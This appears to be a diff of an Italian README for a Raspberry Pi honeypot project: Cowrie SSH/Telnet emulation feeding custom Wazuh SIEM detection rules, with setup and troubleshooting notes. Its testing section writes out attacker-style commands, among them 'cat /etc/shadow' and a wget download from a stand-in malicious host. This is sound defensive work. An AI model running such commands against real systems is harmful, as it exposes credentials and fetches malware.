@@ -1,4 +1,4 @@
-# Honeypot — Cowrie SSH/Telnet con integrazione Wazuh SIEM
+# Honeypot - Cowrie SSH/Telnet con integrazione Wazuh SIEM
 
 Un progetto di cybersecurity per trasformare il Raspberry Pi in una "trappola" (Honeypot) capace di attirare attaccanti, registrare le loro azioni e analizzarle in tempo reale tramite un SIEM. Include la configurazione completa, le regole custom per Wazuh, e tutti i problemi che ho incontrato con le relative soluzioni.
 
@@ -6,23 +6,23 @@ Un progetto di cybersecurity per trasformare il Raspberry Pi in una "trappola" (
 
 ## Teoria: Cos'e' un Honeypot
 
-Un honeypot e' un sistema deliberatamente esposto e apparentemente vulnerabile, progettato per attirare attaccanti. Non contiene dati reali e non fa parte dell'infrastruttura produttiva — il suo unico scopo e' **osservare e registrare le tecniche di attacco**.
+Un honeypot e' un sistema deliberatamente esposto e apparentemente vulnerabile, progettato per attirare attaccanti. Non contiene dati reali e non fa parte dell'infrastruttura produttiva - il suo unico scopo e' **osservare e registrare le tecniche di attacco**.
 
 ### Classificazione degli Honeypot
 
 | Tipo | Interazione | Esempio | Rischio |
 |---|---|---|---|
-| **Low interaction** | Emula solo banner e login | Cowrie, Kippo, HoneyD | Basso — l'attaccante interagisce con un simulatore |
-| **Medium interaction** | Emula servizi parziali | Cowrie (con comandi), Dionaea | Medio — comandi limitati ma credibili |
-| **High interaction** | Sistema operativo reale, completo | VM dedicata, T-Pot | Alto — se l'attaccante evade, ha accesso alla rete |
+| **Low interaction** | Emula solo banner e login | Cowrie, Kippo, HoneyD | Basso - l'attaccante interagisce con un simulatore |
+| **Medium interaction** | Emula servizi parziali | Cowrie (con comandi), Dionaea | Medio - comandi limitati ma credibili |
+| **High interaction** | Sistema operativo reale, completo | VM dedicata, T-Pot | Alto - se l'attaccante evade, ha accesso alla rete |
 
 ### Cowrie: Medium-Interaction SSH/Telnet Honeypot
 
 **Cowrie** emula un server SSH e Telnet con un filesystem finto (basato su Debian). Quando un attaccante si collega:
 
-1. Puo' provare credenziali (brute force) — Cowrie accetta password comuni di proposito
+1. Puo' provare credenziali (brute force) - Cowrie accetta password comuni di proposito
 2. Una volta "dentro", crede di essere su un vero server Linux
-3. Puo' eseguire comandi (`ls`, `cat /etc/passwd`, `wget malware.exe`) — Cowrie simula le risposte
+3. Puo' eseguire comandi (`ls`, `cat /etc/passwd`, `wget malware.exe`) - Cowrie simula le risposte
 4. Se tenta di scaricare file (payload malevoli), Cowrie li cattura per analisi
 
 Ogni azione viene registrata in formato JSON nel file `cowrie.json`, con timestamp, IP sorgente, username, password, comandi eseguiti.
@@ -88,7 +88,7 @@ mkdir -p ~/cowrie/etc
 cd ~/cowrie
 ```
 
-La struttura `var/log/cowrie` sara' montata come volume nel container — i log di Cowrie verranno scritti qui, dove Wazuh potra' leggerli.
+La struttura `var/log/cowrie` sara' montata come volume nel container - i log di Cowrie verranno scritti qui, dove Wazuh potra' leggerli.
 
 #### Docker Compose
 
@@ -105,7 +105,7 @@ services:
       - "2222:2222"  # Porta SSH Honeypot
       - "2223:2223"  # Porta Telnet Honeypot
     volumes:
-      # Monta SOLO i log — NON montare /etc (vedi Troubleshooting Errore 1)
+      # Monta SOLO i log - NON montare /etc (vedi Troubleshooting Errore 1)
       - ./var/log/cowrie:/cowrie/cowrie-git/var/log/cowrie
 ```
 
@@ -195,18 +195,18 @@ Le regole di default di Wazuh non coprono gli eventi specifici di Cowrie. Ho dov
     <group>authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,</group>
   </rule>
 
-  <!-- Login riuscito — CRITICO: un attaccante e' "dentro" l'honeypot -->
+  <!-- Login riuscito - CRITICO: un attaccante e' "dentro" l'honeypot -->
   <rule id="100012" level="10">
     <if_sid>100010</if_sid>
     <field name="eventid">cowrie.login.success</field>
-    <description>Cowrie: INTRUSIONE RIUSCITA — Un attaccante e' entrato nell'Honeypot</description>
+    <description>Cowrie: INTRUSIONE RIUSCITA - Un attaccante e' entrato nell'Honeypot</description>
     <mitre>
       <id>T1078</id>  <!-- Valid Accounts -->
     </mitre>
     <group>authentication_success,pci_dss_10.2.5,</group>
   </rule>
 
-  <!-- Esecuzione comandi — l'attaccante sta esplorando -->
+  <!-- Esecuzione comandi - l'attaccante sta esplorando -->
   <rule id="100013" level="7">
     <if_sid>100010</if_sid>
     <field name="eventid">cowrie.command.input</field>
@@ -218,7 +218,7 @@ Le regole di default di Wazuh non coprono gli eventi specifici di Cowrie. Ho dov
 
 ### Spiegazione delle regole
 
-**Struttura gerarchica:** La regola `100010` e' la regola padre che cattura qualsiasi evento Cowrie (il campo `eventid` inizia con `cowrie.`). Le regole figlie (`100011-100013`) usano `<if_sid>100010</if_sid>` per attivarsi solo se la regola padre ha fatto match — questo evita di riscrivere la condizione JSON in ogni regola.
+**Struttura gerarchica:** La regola `100010` e' la regola padre che cattura qualsiasi evento Cowrie (il campo `eventid` inizia con `cowrie.`). Le regole figlie (`100011-100013`) usano `<if_sid>100010</if_sid>` per attivarsi solo se la regola padre ha fatto match - questo evita di riscrivere la condizione JSON in ogni regola.
 
 **Livelli di allarme (level):**
 
@@ -245,7 +245,7 @@ Incollare un esempio di log JSON di Cowrie e verificare che la regola corretta f
 
 ---
 
-## Troubleshooting — Esperienza Personale
+## Troubleshooting - Esperienza Personale
 
 ### Errore 1: Container in restart loop infinito
 
@@ -261,7 +261,7 @@ twistd: Unknown command: cowrie
 
 **Lezione:** Montare un volume vuoto sopra una directory non-vuota del container la rende vuota dentro il container. Docker **sovrascrive** il contenuto del container con quello dell'host, non il contrario.
 
-### Errore 2: Wazuh — "Too many fields for JSON decoder"
+### Errore 2: Wazuh - "Too many fields for JSON decoder"
 
 **Sintomo:** La dashboard Wazuh non mostrava nessun evento Cowrie. Il file `/var/ossec/logs/ossec.log` conteneva:
 
@@ -303,7 +303,7 @@ ssh -p 2222 root@192.168.0.102
 
 **Sintomo:** Wazuh riceveva i log (verificato con `logall_json` in debug mode), ma la dashboard non mostrava nessun alert grafico.
 
-**Causa:** Mancavano le regole custom XML. Wazuh riceveva gli eventi JSON ma non sapeva come classificarli — senza una regola che fa match, l'evento viene registrato nei log interni ma non genera un alert visibile sulla dashboard.
+**Causa:** Mancavano le regole custom XML. Wazuh riceveva gli eventi JSON ma non sapeva come classificarli - senza una regola che fa match, l'evento viene registrato nei log interni ma non genera un alert visibile sulla dashboard.
 
 **Soluzione:** Ho creato le regole custom (sezione sopra) e le ho validate con `wazuh-logtest` prima di applicarle. Dopo il riavvio, gli alert hanno iniziato ad apparire.
 
@@ -321,11 +321,11 @@ Da un altro PC (es. Kali Linux):
 ssh -p 2222 root@<IP_RASPBERRY>
 ```
 
-Inserire password a caso — ogni tentativo fallito genera un evento `cowrie.login.failed` → alert Wazuh rule 100011.
+Inserire password a caso - ogni tentativo fallito genera un evento `cowrie.login.failed` → alert Wazuh rule 100011.
 
 ### 2. Simulare un'intrusione
 
-Inserire una password debole come `root`, `12345`, `password` — Cowrie le accetta deliberatamente. Questo genera un evento `cowrie.login.success` → alert Wazuh rule 100012 (livello 10 = critico).
+Inserire una password debole come `root`, `12345`, `password` - Cowrie le accetta deliberatamente. Questo genera un evento `cowrie.login.success` → alert Wazuh rule 100012 (livello 10 = critico).
 
 ### 3. Eseguire comandi post-intrusione
 
@@ -334,7 +334,7 @@ Una volta "dentro" l'honeypot:
 ```bash
 whoami          # Genera alert rule 100013
 ls              # Genera alert rule 100013
-cat /etc/shadow # Genera alert rule 100013 — l'attaccante cerca credenziali
+cat /etc/shadow # Genera alert rule 100013 - l'attaccante cerca credenziali
 wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di download
 ```
 
@@ -342,10 +342,10 @@ wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di downloa
 
 Andare su **Threat Hunting** e filtrare per:
 
-- `rule.id: 100012` — mostra tutte le intrusioni riuscite nell'honeypot
-- `rule.id: 100013` — mostra tutti i comandi eseguiti dagli attaccanti
-- `rule.mitre.id: T1078` — filtra per tecnica MITRE ATT&CK
+- `rule.id: 100012` - mostra tutte le intrusioni riuscite nell'honeypot
+- `rule.id: 100013` - mostra tutti i comandi eseguiti dagli attaccanti
+- `rule.mitre.id: T1078` - filtra per tecnica MITRE ATT&CK
 
 ---
 
-Prossimo step: [SOC Analyst / Wazuh](../SOC%20Analyst/) — installazione e configurazione del SIEM Wazuh.
+Prossimo step: [SOC Analyst / Wazuh](../SOC%20Analyst/) - installazione e configurazione del SIEM Wazuh.
